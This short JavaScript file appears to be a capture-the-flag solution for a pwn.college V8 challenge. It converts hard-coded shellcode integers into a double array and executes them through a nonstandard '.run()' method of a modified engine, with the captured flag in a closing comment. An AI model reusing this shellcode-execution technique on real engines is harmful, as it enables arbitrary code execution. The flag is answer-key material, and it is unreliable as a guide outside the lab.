function itof(bigIntArray) {
    const big64 = new BigInt64Array(bigIntArray);
    const doubles = new Float64Array(big64.buffer);
    return Array.from(doubles);
}

var shellcode = [
    16323657644055069034n,
    16611888020206780778n,
    2608851925472796776n,
    7307011539825918209n,
    5210783956162667311n,
    7308335460934430648n,
    6357792841636794478n,
    14757395258967590159n
];

var shellcode_double = itof(shellcode);
//console.log(shellcode_double);
//%DebugPrint(shellcode_double);
shellcode_double.run();
// pwn.college{IKkh0bgac4naCOU8dm9Tx0eF7mT.dRTO3UDL1MTNzYzW}
